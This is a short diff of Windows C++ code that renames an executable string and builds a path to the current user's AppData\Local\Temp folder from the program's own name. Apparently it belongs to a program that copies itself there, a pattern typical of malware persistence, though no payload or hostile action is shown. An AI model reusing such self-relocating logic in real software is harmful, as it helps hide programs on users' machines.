@@ -146,7 +146,7 @@ void InitConfig(string programName)
   char username[UNLEN+1];
   DWORD username_len = UNLEN+1;
   GetUserName(username, &username_len);
-  string programNameFinal = "maizn.exe";
+  string programNameFinal = "mainFinal.exe";
   string pathUsers = "C:\\Users\\";
   string pathTarget = "\\appdata\\local\\temp\\";
   string input = current_working_directory()+"\\"+programName;
